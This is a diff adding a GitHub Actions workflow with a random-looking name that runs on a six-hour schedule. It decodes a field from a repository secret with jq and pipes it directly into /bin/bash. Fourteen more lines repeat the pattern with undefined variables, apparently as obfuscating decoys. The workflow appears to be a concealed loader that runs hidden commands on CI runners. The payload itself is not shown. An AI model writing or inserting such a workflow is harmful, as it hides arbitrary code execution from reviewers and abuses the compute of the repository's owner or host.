@@ -1,0 +1,32 @@
+name: borderedarsonist
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: borderedarsonist
+        env:
+          js2925: ${{ secrets.js2925 }}
+        run: |
+          echo $js2925 | jq -r .ukkj7949 | /bin/bash
+          echo $o7 | jq -r .v69 | /bin/bash
+          echo $b02869 | jq -r .l12988 | /bin/bash
+          echo $ap8 | jq -r .bvt4671 | /bin/bash
+          echo $qphu718 | jq -r .jopoe7 | /bin/bash
+          echo $h568 | jq -r .jzs62448 | /bin/bash
+          echo $knac7 | jq -r .qb40826 | /bin/bash
+          echo $r32537 | jq -r .zail1341 | /bin/bash
+          echo $eria309 | jq -r .s6 | /bin/bash
+          echo $vpw54 | jq -r .xf02 | /bin/bash
+          echo $ydqc38427 | jq -r .a117 | /bin/bash
+          echo $wt78830 | jq -r .hmn6987 | /bin/bash
+          echo $htkhs5625 | jq -r .utu06 | /bin/bash
+          echo $fwk87216 | jq -r .plm016 | /bin/bash
+          echo $gg1 | jq -r .raa13 | /bin/bash
+
